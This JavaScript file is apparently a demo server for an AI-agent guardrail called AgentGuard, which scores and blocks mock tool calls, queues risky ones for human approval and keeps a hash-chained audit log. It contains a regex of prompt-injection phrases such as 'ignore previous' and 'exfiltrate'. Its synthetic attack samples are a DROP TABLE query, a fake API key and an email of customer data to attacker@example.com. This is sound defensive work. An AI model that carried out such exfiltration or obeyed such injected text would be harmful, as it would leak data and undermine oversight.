import http from "node:http";
import fs from "node:fs/promises";
import path from "node:path";
import { createHash, randomUUID } from "node:crypto";
import { fileURLToPath } from "node:url";

const prototypeDir = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.resolve(prototypeDir, "..");
const publicDir = path.join(prototypeDir, "public");
const runtimeDir = path.join(rootDir, ".agentguard-runtime");
const stateFile = path.join(runtimeDir, "state.json");
const demoDataDir = path.join(rootDir, "demo-data");
const port = Number(process.env.PORT ?? 4173);

const descriptors = [
  {
    name: "read_document",
    description: "Read a synthetic document from the demo-data directory.",
    inputSchema: { type: "object", properties: { path: { type: "string" } }, required: ["path"] }
  },
  {
    name: "send_email",
    description: "Write a mock email record to the local demo outbox. Does not send real email.",
    inputSchema: {
      type: "object",
      properties: { to: { type: "string" }, subject: { type: "string" }, body: { type: "string" } },
      required: ["to", "subject", "body"]
    }
  },
  {
    name: "query_database",
    description: "Run read-only SELECT queries against synthetic customer records.",
    inputSchema: { type: "object", properties: { sql: { type: "string" } }, required: ["sql"] }
  },
  {
    name: "create_ticket",
    description: "Create a synthetic support ticket for workflow tracking.",
    inputSchema: {
      type: "object",
      properties: {
        title: { type: "string" },
        description: { type: "string" },
        priority: { type: "string", enum: ["low", "medium", "high"] }
      },
      required: ["title", "description", "priority"]
    }
  }
];

const policies = [
  ["Rule 1", "Known low-risk tools can run automatically.", "critical"],
  ["Rule 2", "Unknown, discovered-only, or blocked tools are denied.", "critical"],
  ["Rule 3", "Secrets, passwords, API keys, path traversal, and SQL mutation commands are hard blocked.", "critical"],
  ["Rule 4", "PII adds risk and may force approval before data leaves the agent boundary.", "medium"],
  ["Rule 5", "External email recipients add risk and require approval when combined with sensitive data.", "medium"],
  ["Rule 6", "Every decision is logged to the flight recorder and tamper-evident audit chain.", "medium"]
];

const customers = [
  {
    id: 1,
    name: "Ada Lovelace",
    email: "ada.lovelace@demo.customer",
    phone: "555-010-1111",
    tier: "enterprise",
    revenue: 120000,
    openComplaints: 2
  },
  {
    id: 2,
    name: "Grace Hopper",
    email: "grace.hopper@demo.customer",
    phone: "555-010-2222",
    tier: "enterprise",
    revenue: 98000,
    openComplaints: 1
  },
  {
    id: 3,
    name: "Katherine Johnson",
    email: "katherine.johnson@demo.customer",
    phone: "555-010-3333",
    tier: "growth",
    revenue: 45000,
    openComplaints: 0
  }
];

const baseRisk = {
  create_ticket: 10,
  read_document: 25,
  query_database: 35,
  send_email: 45
};

let state = await loadState();

async function loadState() {
  await fs.mkdir(runtimeDir, { recursive: true });

  try {
    const raw = await fs.readFile(stateFile, "utf8");
    return JSON.parse(raw);
  } catch {
    const seeded = {
      tools: descriptors.map(scanTool),
      policies: policies.map(([name, description, severity]) => ({
        id: randomUUID(),
        name,
        description,
        severity,
        enabled: true
      })),
      sessions: [],
      toolCalls: [],
      approvals: [],
      auditEvents: [],
      customers
    };
    addAudit(seeded, "SEED_COMPLETE", "System", null, "seed", { message: "Standalone synthetic state created" });
    await saveState(seeded);
    return seeded;
  }
}

async function saveState(nextState = state) {
  await fs.mkdir(runtimeDir, { recursive: true });
  await fs.writeFile(stateFile, JSON.stringify(nextState, null, 2));
}

function now() {
  return new Date().toISOString();
}

function scoreLevel(score, hardBlock = false) {
  if (hardBlock || score >= 81) return "CRITICAL";
  if (score >= 61) return "HIGH";
  if (score >= 31) return "MEDIUM";
  return "LOW";
}

function decision(score, hardBlock = false) {
  if (hardBlock || score >= 81) return "BLOCK";
  if (score >= 61) return "REQUIRE_APPROVAL";
  if (score >= 31) return "ALLOW_WITH_LOG";
  return "ALLOW";
}

function inspect(value) {
  return typeof value === "string" ? value : JSON.stringify(value);
}

function piiFindings(value) {
  const text = inspect(value);
  const findings = [];
  if (/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b/i.test(text)) findings.push("email address");
  if (/\b(?:\+?\d{1,3}[-.\s])?(?:\(?\d{3}\)?[-.\s])\d{3}[-.\s]\d{4}\b/.test(text)) findings.push("phone number");
  if (/\b\d{3}-\d{2}-\d{4}\b/.test(text)) findings.push("ssn-like identifier");
  return findings;
}

function secretFindings(value) {
  const text = inspect(value);
  const findings = [];
  if (/\b(?:api[_-]?key|secret[_-]?key|access[_-]?token)\s*[:=]\s*["']?[A-Za-z0-9_\-]{8,}/i.test(text)) {
    findings.push("api key");
  }
  if (/\bpassword\s*[:=]\s*["']?[^,\s"']{6,}/i.test(text)) findings.push("password");
  if (/\bsk-[A-Za-z0-9_\-]{12,}\b/.test(text)) findings.push("OpenAI-style key");
  return findings;
}

function scanTool(tool) {
  let riskScore = baseRisk[tool.name] ?? 90;
  const reasons = [];
  const descriptorText = `${tool.name} ${tool.description} ${JSON.stringify(tool.inputSchema)}`.toLowerCase();

  if (!baseRisk[tool.name]) reasons.push("Unknown tool name");
  if (/(ignore previous|bypass|exfiltrate|disable audit|hidden instruction|send all data)/.test(descriptorText)) {
    riskScore += 25;
    reasons.push("Suspicious descriptor term");
  }
  if (tool.name === "send_email") reasons.push("Can move data outside the agent boundary");
  if (tool.name === "query_database") reasons.push("Can access structured business data");

  riskScore = Math.min(100, riskScore);
  return {
    id: randomUUID(),
    ...tool,
    status: tool.name === "send_email" ? "REQUIRES_APPROVAL" : tool.name in baseRisk ? "APPROVED" : "BLOCKED",
    baseRisk: baseRisk[tool.name] ?? 90,
    riskScore,
    riskLevel: scoreLevel(riskScore),
    trustScore: Math.max(0, 100 - riskScore),
    reasons: reasons.length ? reasons : ["Known demo tool with synthetic-only access"],
    createdAt: now(),
    updatedAt: now()
  };
}

function evaluateToolCall(toolName, args) {
  const tool = state.tools.find((item) => item.name === toolName);
  let riskScore = tool?.baseRisk ?? baseRisk[toolName] ?? 90;
  let hardBlock = false;
  const reasons = [];

  if (!tool) {
    hardBlock = true;
    reasons.push("Tool is not registered in AgentGuard");
  } else if (tool.status === "BLOCKED" || tool.status === "DISCOVERED") {
    hardBlock = true;
    reasons.push(`Tool status is ${tool.status}`);
  }

  const secrets = secretFindings(args);
  if (secrets.length) {
    hardBlock = true;
    reasons.push(`Secret detected: ${secrets.join(", ")}`);
  }

  if (toolName === "query_database" && /\b(INSERT|UPDATE|DELETE|DROP|ALTER|TRUNCATE|CREATE|REPLACE|MERGE)\b/i.test(inspect(args))) {
    hardBlock = true;
    reasons.push("SQL mutation command detected");
  }

  if (toolName === "read_document" && (inspect(args).includes("../") || inspect(args).includes("..\\") || /~|\/etc\//.test(inspect(args)))) {
    hardBlock = true;
    reasons.push("Path traversal attempt detected");
  }

  const pii = piiFindings(args);
  if (pii.length) {
    riskScore += 30;
    reasons.push(`PII detected: ${pii.join(", ")}`);
  }

  if (toolName === "send_email") {
    const to = String(args.to ?? "");
    const domain = to.split("@")[1]?.toLowerCase() ?? "";
    if (!["agentguard.local", "company.local", "internal.local"].includes(domain)) {
      riskScore += 30;
      reasons.push(`External recipient: ${to}`);
    }
  }

  if (tool?.status === "REQUIRES_APPROVAL") {
    riskScore = Math.max(riskScore, 61);
    reasons.push("Tool requires human approval by policy");
  }

  riskScore = Math.min(100, riskScore);
  return {
    decision: decision(riskScore, hardBlock),
    riskScore,
    riskLevel: scoreLevel(riskScore, hardBlock),
    reasons: reasons.length ? reasons : ["No blocking policy matched"],
    hardBlock,
    redactedArguments: preserveRecipients(args, redact(args))
  };
}

function preserveRecipients(original, redacted) {
  for (const key of Object.keys(original)) {
    if (["to", "cc", "bcc", "recipient", "recipients"].includes(key.toLowerCase())) {
      redacted[key] = original[key];
    }
  }
  return redacted;
}

function evaluateOutput(toolName, output, priorScore) {
  const reasons = [];
  let riskScore = priorScore;
  let hardBlock = false;
  const secrets = secretFindings(output);
  if (secrets.length) {
    hardBlock = true;
    reasons.push(`Secret detected in tool output: ${secrets.join(", ")}`);
  }
  const pii = piiFindings(output);
  if (pii.length) {
    riskScore += 30;
    reasons.push(`PII detected in tool output: ${pii.join(", ")}`);
  }
  riskScore = Math.min(100, riskScore);
  return {
    decision: hardBlock ? "BLOCK" : toolName === "send_email" ? decision(riskScore) : "ALLOW_WITH_LOG",
    riskScore,
    riskLevel: scoreLevel(riskScore, hardBlock),
    reasons: reasons.length ? reasons : ["Tool output passed post-check"],
    hardBlock
  };
}

function redact(value) {
  if (typeof value === "string") {
    return value
      .replace(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b/gi, "[REDACTED EMAIL]")
      .replace(/(?:\+?\d{1,3}[-.\s]?)?(?:\(?\d{3}\)?[-.\s]?)\d{3}[-.\s]?\d{4}\b/g, "[REDACTED PHONE]")
      .replace(/\b(?:api[_-]?key|secret[_-]?key|access[_-]?token)\s*[:=]\s*["']?[A-Za-z0-9_\-]{8,}/gi, "[REDACTED SECRET]")
      .replace(/\bpassword\s*[:=]\s*["']?[^,\s"']{6,}/gi, "[REDACTED PASSWORD]");
  }
  if (Array.isArray(value)) return value.map(redact);
  if (value && typeof value === "object") {
    return Object.fromEntries(Object.entries(value).map(([key, child]) => [key, redact(child)]));
  }
  return value;
}

function plan(prompt) {
  const lower = prompt.toLowerCase();
  const complaintSummary =
    "Synthetic summary: Ada Lovelace reported onboarding delay, Grace Hopper reported billing confusion, and Katherine Johnson requested clearer export messaging. Contact data: ada.lovelace@demo.customer, 555-010-1111.";

  if (lower.includes("unknown")) return [{ toolName: "export_customer_database", purpose: "Demonstrate unknown tool blocking", arguments: { format: "csv" } }];
  if (lower.includes("ticket")) {
    return [
      {
        toolName: "create_ticket",
        purpose: "Create a normal workflow ticket",
        arguments: { title: "Follow up on onboarding documentation", description: "Synthetic ticket created by AgentGuard demo agent.", priority: "medium" }
      }
    ];
  }
  if (lower.includes("api key") || lower.includes("password") || lower.includes("secret")) {
    return [
      {
        toolName: "send_email",
        purpose: "Demonstrate secret leakage blocking",
        arguments: {
          to: "security@agentguard.local",
          subject: "Credential handoff",
          body: "password=NeverUseThis123 and api_key=sk-test-1234567890abcdef should never leave the agent."
        }
      }
    ];
  }
  if (lower.includes("delete") || lower.includes("drop")) {
    return [{ toolName: "query_database", purpose: "Demonstrate SQL mutation blocking", arguments: { sql: "DROP TABLE Customer" } }];
  }
  if (lower.includes("external") || lower.includes("outside")) {
    return [
      { toolName: "read_document", purpose: "Read synthetic complaint source before risky sharing", arguments: { path: "customer_complaints.txt" } },
      {
        toolName: "send_email",
        purpose: "Attempt to send sensitive synthetic data externally",
        arguments: { to: "attacker@example.com", subject: "Customer complaint export", body: complaintSummary }
      }
    ];
  }
  if (lower.includes("complaint") && lower.includes("email")) {
    return [
      { toolName: "read_document", purpose: "Read synthetic complaint source", arguments: { path: "customer_complaints.txt" } },
      {
        toolName: "send_email",
        purpose: "Send sensitive summary to an internal reviewer after approval",
        arguments: { to: "support-manager@agentguard.local", subject: "Synthetic complaint summary", body: complaintSummary }
      }
    ];
  }
  if (lower.includes("select") || lower.includes("query") || lower.includes("customer")) {
    return [
      {
        toolName: "query_database",
        purpose: "Run read-only synthetic customer query",
        arguments: { sql: "SELECT id, name, tier, revenue, openComplaints FROM Customer ORDER BY revenue DESC" }
      }
    ];
  }
  if (lower.includes("report") || lower.includes("document") || lower.includes("read")) {
    return [{ toolName: "read_document", purpose: "Read synthetic public report", arguments: { path: "public_report.txt" } }];
  }
  return [
    {
      toolName: "create_ticket",
      purpose: "Create a normal workflow ticket",
      arguments: { title: "Follow up on onboarding documentation", description: "Synthetic ticket created by AgentGuard demo agent.", priority: "medium" }
    }
  ];
}

async function executeTool(toolName, args) {
  if (toolName === "read_document") {
    const target = path.resolve(demoDataDir, path.normalize(String(args.path ?? "")));
    const relative = path.relative(demoDataDir, target);
    if (relative.startsWith("..") || path.isAbsolute(relative)) throw new Error("Document path must stay inside demo-data.");
    return { path: path.basename(target), text: await fs.readFile(target, "utf8") };
  }
  if (toolName === "send_email") {
    const record = { id: `mock-email-${Date.now()}`, ...args, sentAt: now(), transport: "mock-outbox" };
    await fs.appendFile(path.join(runtimeDir, "outbox.jsonl"), `${JSON.stringify(record)}\n`);
    return { id: record.id, status: "mock_sent", note: "No real email was sent." };
  }
  if (toolName === "query_database") {
    if (!/^\s*SELECT\b/i.test(String(args.sql ?? ""))) throw new Error("Only SELECT is allowed.");
    return { rows: state.customers.map(({ email, phone, ...safe }) => safe) };
  }
  if (toolName === "create_ticket") {
    return { id: `TICKET-${Math.floor(Math.random() * 9000 + 1000)}`, ...args, status: "created" };
  }
  throw new Error(`Unknown tool: ${toolName}`);
}

function addAudit(targetState, eventType, entityType, entityId, actor, data) {
  const prevHash = targetState.auditEvents.at(-1)?.hash ?? null;
  const payload = { eventType, entityType, entityId, actor, data };
  const hash = createHash("sha256").update(JSON.stringify({ payload, prevHash })).digest("hex");
  const event = { id: randomUUID(), eventType, entityType, entityId, actor, data, prevHash, hash, valid: true, createdAt: now() };
  targetState.auditEvents.push(event);
  return event;
}

function verifyAudit() {
  let prevHash = null;
  return state.auditEvents.map((event) => {
    const payload = {
      eventType: event.eventType,
      entityType: event.entityType,
      entityId: event.entityId,
      actor: event.actor,
      data: event.data
    };
    const expected = createHash("sha256").update(JSON.stringify({ payload, prevHash: event.prevHash })).digest("hex");
    const valid = event.prevHash === prevHash && event.hash === expected;
    prevHash = event.hash;
    return { ...event, valid };
  });
}

async function runSession(body) {
  const planned = plan(body.prompt ?? "");
  const session = {
    id: randomUUID(),
    prompt: body.prompt,
    userEmail: body.userEmail ?? "employee@agentguard.local",
    userRole: body.userRole ?? "employee",
    status: "RUNNING",
    finalAnswer: null,
    planned,
    createdAt: now(),
    updatedAt: now()
  };
  state.sessions.unshift(session);
  addAudit(state, "SESSION_STARTED", "AgentSession", session.id, session.userEmail, { prompt: session.prompt, plannedCalls: planned });

  const notes = [];
  let finalStatus = "COMPLETED";

  for (const plannedCall of planned) {
    const precheck = evaluateToolCall(plannedCall.toolName, plannedCall.arguments);
    const call = {
      id: randomUUID(),
      sessionId: session.id,
      toolName: plannedCall.toolName,
      purpose: plannedCall.purpose,
      arguments: plannedCall.arguments,
      output: null,
      decision: precheck.decision,
      riskScore: precheck.riskScore,
      riskLevel: precheck.riskLevel,
      reasons: [...precheck.reasons],
      status: precheck.decision === "BLOCK" ? "BLOCKED" : precheck.decision === "REQUIRE_APPROVAL" ? "PENDING_APPROVAL" : "EXECUTING",
      createdAt: now(),
      updatedAt: now()
    };
    state.toolCalls.unshift(call);

    if (precheck.decision === "BLOCK") {
      addAudit(state, "TOOL_CALL_BLOCKED", "ToolCall", call.id, session.userEmail, { toolName: call.toolName, reasons: precheck.reasons });
      finalStatus = "BLOCKED";
      notes.push(`${call.toolName} was blocked: ${precheck.reasons.join("; ")}`);
      break;
    }

    if (precheck.decision === "REQUIRE_APPROVAL") {
      const approval = {
        id: randomUUID(),
        toolCallId: call.id,
        status: "PENDING",
        requestedBy: session.userEmail,
        reviewedBy: null,
        rawArguments: plannedCall.arguments,
        redactedArgs: precheck.redactedArguments,
        toolCall: call,
        createdAt: now(),
        reviewedAt: null
      };
      state.approvals.unshift(approval);
      addAudit(state, "APPROVAL_REQUESTED", "Approval", approval.id, session.userEmail, { toolName: call.toolName, riskScore: call.riskScore });
      finalStatus = "WAITING_FOR_APPROVAL";
      notes.push(`${call.toolName} is waiting for approval.`);
      break;
    }

    const output = await executeTool(plannedCall.toolName, plannedCall.arguments);
    const postcheck = evaluateOutput(plannedCall.toolName, output, precheck.riskScore);
    call.output = postcheck.hardBlock ? { blockedOutput: true, preview: "[blocked by post-check]" } : output;
    call.riskScore = postcheck.riskScore;
    call.riskLevel = postcheck.riskLevel;
    call.reasons.push(...postcheck.reasons);
    call.status = postcheck.hardBlock ? "BLOCKED_OUTPUT" : "EXECUTED";
    call.updatedAt = now();
    addAudit(state, postcheck.hardBlock ? "TOOL_OUTPUT_BLOCKED" : "TOOL_CALL_EXECUTED", "ToolCall", call.id, session.userEmail, { toolName: call.toolName, riskScore: call.riskScore });
    if (postcheck.hardBlock) {
      finalStatus = "BLOCKED";
      notes.push(`${call.toolName} output was blocked.`);
      break;
    }
    notes.push(`${call.toolName} executed with decision ${precheck.decision}.`);
  }

  session.status = finalStatus;
  session.finalAnswer =
    finalStatus === "COMPLETED"
      ? `Session completed. ${notes.join(" ")}`
      : finalStatus === "WAITING_FOR_APPROVAL"
        ? `Session paused for human approval. ${notes.join(" ")}`
        : `Session blocked by AgentGuard. ${notes.join(" ")}`;
  session.updatedAt = now();
  addAudit(state, "SESSION_FINISHED", "AgentSession", session.id, session.userEmail, { status: session.status, finalAnswer: session.finalAnswer });
  await saveState();
  return { sessionId: session.id, status: session.status, finalAnswer: session.finalAnswer, plannedCalls: planned };
}

async function approve(id, actor, redacted = false) {
  const approval = state.approvals.find((item) => item.id === id);
  if (!approval) throw new Error("Approval not found");
  if (approval.status !== "PENDING") throw new Error("Approval has already been reviewed");
  const call = state.toolCalls.find((item) => item.id === approval.toolCallId);
  if (!call) throw new Error("Tool call not found");
  const args = redacted ? approval.redactedArgs : approval.rawArguments;
  const output = await executeTool(call.toolName, args);
  const postcheck = evaluateOutput(call.toolName, output, call.riskScore);
  call.arguments = args;
  call.output = postcheck.hardBlock ? { blockedOutput: true, preview: "[blocked by post-check]" } : output;
  call.decision = postcheck.hardBlock ? "BLOCK" : "ALLOW_WITH_LOG";
  call.riskScore = postcheck.riskScore;
  call.riskLevel = postcheck.riskLevel;
  call.reasons.push(...postcheck.reasons);
  call.status = postcheck.hardBlock ? "BLOCKED_OUTPUT" : "APPROVED_EXECUTED";
  call.updatedAt = now();
  approval.status = redacted ? "REDACTED_APPROVED" : "APPROVED";
  approval.reviewedBy = actor;
  approval.reviewedAt = now();
  const session = state.sessions.find((item) => item.id === call.sessionId);
  if (session) {
    session.status = postcheck.hardBlock ? "BLOCKED" : "COMPLETED";
    session.finalAnswer = postcheck.hardBlock ? "Approved call was blocked during output post-check." : "Approved tool call executed through the mock MCP server.";
    session.updatedAt = now();
  }
  addAudit(state, redacted ? "APPROVAL_REDACTED_APPROVED" : "APPROVAL_APPROVED", "Approval", approval.id, actor, { toolName: call.toolName, riskScore: call.riskScore });
  await saveState();
  return approval;
}

async function reject(id, actor) {
  const approval = state.approvals.find((item) => item.id === id);
  if (!approval) throw new Error("Approval not found");
  const call = state.toolCalls.find((item) => item.id === approval.toolCallId);
  approval.status = "REJECTED";
  approval.reviewedBy = actor;
  approval.reviewedAt = now();
  if (call) {
    call.status = "REJECTED";
    call.decision = "BLOCK";
    const session = state.sessions.find((item) => item.id === call.sessionId);
    if (session) {
      session.status = "BLOCKED";
      session.finalAnswer = "Human reviewer rejected the pending tool call.";
    }
  }
  addAudit(state, "APPROVAL_REJECTED", "Approval", approval.id, actor, { toolName: call?.toolName });
  await saveState();
  return approval;
}

async function readBody(req) {
  let raw = "";
  for await (const chunk of req) raw += chunk;
  return raw ? JSON.parse(raw) : {};
}

function send(res, status, payload, contentType = "application/json") {
  res.writeHead(status, { "Content-Type": contentType });
  res.end(contentType === "application/json" ? JSON.stringify(payload) : payload);
}

function metrics() {
  return {
    sessions: state.sessions.length,
    calls: state.toolCalls.length,
    pendingApprovals: state.approvals.filter((item) => item.status === "PENDING").length,
    blocked: state.toolCalls.filter((item) => item.status.includes("BLOCKED")).length
  };
}

async function api(req, res, pathname) {
  const body = req.method === "POST" || req.method === "PATCH" ? await readBody(req) : {};
  if (req.method === "GET" && pathname === "/api/health") return send(res, 200, { ok: true, service: "agentguard-standalone", timestamp: now() });
  if (req.method === "POST" && pathname === "/api/sessions") return send(res, 201, await runSession(body));
  if (req.method === "GET" && pathname === "/api/sessions") return send(res, 200, state.sessions.map((session) => ({ ...session, toolCalls: state.toolCalls.filter((call) => call.sessionId === session.id) })));
  if (req.method === "GET" && pathname.startsWith("/api/sessions/")) {
    const id = pathname.split("/").at(-1);
    const session = state.sessions.find((item) => item.id === id);
    return session ? send(res, 200, { ...session, toolCalls: state.toolCalls.filter((call) => call.sessionId === session.id) }) : send(res, 404, { error: "Not found" });
  }
  if (req.method === "GET" && pathname === "/api/tools") return send(res, 200, state.tools);
  if (req.method === "POST" && pathname === "/api/tools/scan") {
    state.tools = descriptors.map((descriptor) => ({ ...scanTool(descriptor), id: state.tools.find((item) => item.name === descriptor.name)?.id ?? randomUUID() }));
    addAudit(state, "TOOLS_SCANNED", "Tool", null, body.actor ?? "admin@agentguard.local", { count: state.tools.length });
    await saveState();
    return send(res, 200, state.tools);
  }
  if (req.method === "PATCH" && pathname.startsWith("/api/tools/") && pathname.endsWith("/status")) {
    const id = pathname.split("/").at(-2);
    const tool = state.tools.find((item) => item.id === id);
    if (!tool) return send(res, 404, { error: "Tool not found" });
    tool.status = body.status;
    tool.updatedAt = now();
    addAudit(state, "TOOL_STATUS_UPDATED", "Tool", id, body.actor ?? "admin@agentguard.local", { name: tool.name, status: tool.status });
    await saveState();
    return send(res, 200, tool);
  }
  if (req.method === "GET" && pathname === "/api/tool-calls") return send(res, 200, state.toolCalls);
  if (req.method === "GET" && pathname === "/api/approvals") return send(res, 200, state.approvals.map((approval) => ({ ...approval, toolCall: state.toolCalls.find((call) => call.id === approval.toolCallId) })));
  if (req.method === "POST" && pathname.startsWith("/api/approvals/")) {
    const [, , , id, action] = pathname.split("/");
    if (action === "approve") return send(res, 200, await approve(id, body.actor ?? "reviewer@agentguard.local"));
    if (action === "reject") return send(res, 200, await reject(id, body.actor ?? "reviewer@agentguard.local"));
    if (action === "redact-approve") return send(res, 200, await approve(id, body.actor ?? "reviewer@agentguard.local", true));
  }
  if (req.method === "GET" && pathname === "/api/audit") return send(res, 200, verifyAudit().reverse());
  if (req.method === "GET" && pathname === "/api/policies") return send(res, 200, state.policies);
  if (req.method === "GET" && pathname === "/api/metrics") return send(res, 200, metrics());
  send(res, 404, { error: "Not found" });
}

async function staticFile(res, pathname) {
  const filePath = pathname === "/" ? path.join(publicDir, "index.html") : path.join(publicDir, pathname);
  const normalized = path.resolve(filePath);
  if (!normalized.startsWith(publicDir)) return send(res, 403, "Forbidden", "text/plain");
  const ext = path.extname(normalized);
  const contentType = ext === ".js" ? "application/javascript" : ext === ".css" ? "text/css" : "text/html";
  try {
    send(res, 200, await fs.readFile(normalized, "utf8"), contentType);
  } catch {
    send(res, 404, "Not found", "text/plain");
  }
}

const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(req.url ?? "/", `http://${req.headers.host}`);
    if (url.pathname.startsWith("/api/")) return await api(req, res, url.pathname);
    return await staticFile(res, url.pathname);
  } catch (error) {
    send(res, 400, { error: error instanceof Error ? error.message : "Unknown error" });
  }
});

server.listen(port, () => {
  console.log(`AgentGuard standalone prototype: http://localhost:${port}`);
  console.log("This no-install fallback uses synthetic local data only.");
});
